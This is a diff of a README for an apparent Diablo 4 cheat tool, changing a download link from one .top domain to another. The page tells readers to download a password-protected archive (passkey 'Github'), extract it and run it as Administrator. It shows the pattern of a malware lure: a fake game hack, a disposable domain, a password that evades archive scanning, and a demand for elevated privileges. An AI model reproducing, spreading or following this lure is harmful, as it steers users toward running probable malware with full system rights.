@@ -6,7 +6,7 @@ Diablo 4 hack with god mode, damage multiplier, unlimited resources, item dupe, 
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -70,7 +70,7 @@ Based on popular mods like **D4Trainer**, **Diablo4Mod**, and **Sanctuary Menu**
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Diablo 4.
 4. Run the hack **as Administrator**.
